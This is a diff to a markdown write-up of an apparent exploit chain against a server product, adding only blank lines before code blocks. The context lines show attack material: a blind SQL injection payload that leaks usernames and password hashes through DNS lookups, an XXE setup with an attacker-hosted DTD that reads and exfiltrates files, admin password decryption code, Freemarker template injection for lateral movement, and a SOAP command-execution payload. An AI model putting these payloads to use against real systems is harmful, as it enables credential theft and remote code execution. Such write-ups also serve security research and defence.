@@ -31,6 +31,7 @@ The injection payload targets two database tables:
 5. Iterate through all positions to reconstruct complete username and password hash
 
 **Example Payload Structure**:
+
 ```
 1111 union ALL SELECT CASE WHEN LEFT(name, {position}) = '{prefix}' 
 THEN '{random_prefix}.{dns_domain}' ELSE NULL END AS result 
@@ -66,6 +67,7 @@ The ChangeCredentialServlet accepts XML input that is parsed with an vulnerable 
 **Server Configuration Requirements**:
 
 Attacker must create the following directory structure on their server:
+
 ```
 /changecredential/xml/CredentialChange.dtd  (references external malicious DTD)
 /2.dtd  (actual payload, reads file and exfiltrates)
@@ -90,6 +92,7 @@ Attacker must create the following directory structure on their server:
 5. Obtain plaintext administrator password
 
 **Code Implementation**:
+
 ```python
 iv = encrypted_password[:16]
 encrypted_data = encrypted_password[16:]
@@ -146,6 +149,7 @@ The deployed ELService66 endpoint processes SOAP requests containing Freemarker 
 4. Achieves lateral movement within internal network
 
 **Freemarker Payload**:
+
 ```xml
 'util:eval' template executes JavaScript that:
 - Creates HttpURLConnection to localhost:81
@@ -178,6 +182,7 @@ The fmService accepts SOAP requests with command strings that are executed direc
 5. Results written to web-accessible file for retrieval
 
 **SOAP Payload Structure**:
+
 ```xml
 <util:exec>
   <arguments>
